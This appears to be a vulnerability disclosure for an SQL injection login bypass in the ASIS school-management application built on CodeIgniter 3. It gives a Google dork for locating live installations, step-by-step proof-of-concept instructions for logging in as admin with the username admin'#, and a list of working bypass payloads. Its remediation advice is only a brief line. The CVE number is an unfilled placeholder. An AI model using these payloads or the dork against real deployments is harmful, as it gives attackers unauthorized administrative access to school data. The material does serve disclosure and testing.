# ASIS | Aplikasi Sistem Sekolah using CodeIgniter 3 - SQL Injection Authentication Bypass

### CVE Assigned:
**[CVE-2024-XXXXX](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-XXXXX)** [mitre.org](https://www.cve.org/CVERecord?id=CVE-2024-XXXXX) [nvd.nist.org](https://nvd.nist.gov/vuln/detail/CVE-2024-XXXXX)

### Date:

> 5 July 2024

### Author Email:

> atoz.chevara@yahoo.com

### Google Dork:

> "ASIS | Aplikasi Sistem Sekolah"

### Vendor Homepage:

> https://www.facebook.com/groups/181558652941070/

### Software Link:

> [ASIS - Aplikasi Sistem Sekolah dengan Framework Codeigniter](https://members.phpmu.com/forum/read/asis--aplikasi-sistem-sekolah-dengan-framework-codeigniter)

### Version:

> v 3.0.0 < 3.2.0

### SQL Injection:

> SQL injection is a type of security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. Usually, it involves the insertion or "injection" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system, and in some cases, issue commands to the operating system.

### Affected Components:

> index.php

> `username` parameter within the login mechanism is vulnerable to SQL Injection.


### Description:

> The presence of SQL Injection in the application enables attackers to issue direct queries to the database through specially crafted requests.

## Proof of Concept:

* Step 1 - Visit http://localhost/asispanel/
* Step 2 - Enter username as `admin'#` and password as `xyz`
* Step 3 – Click `LOGIN` and now you will be logged in as admin.

### Payloads Can be use:

```
admin'#
'||1#
'||1-- 
'=' 'or'
```

## Recommendations

When using this ASIS, it is essential to update the application code to ensure user input sanitization and proper restrictions for special characters.
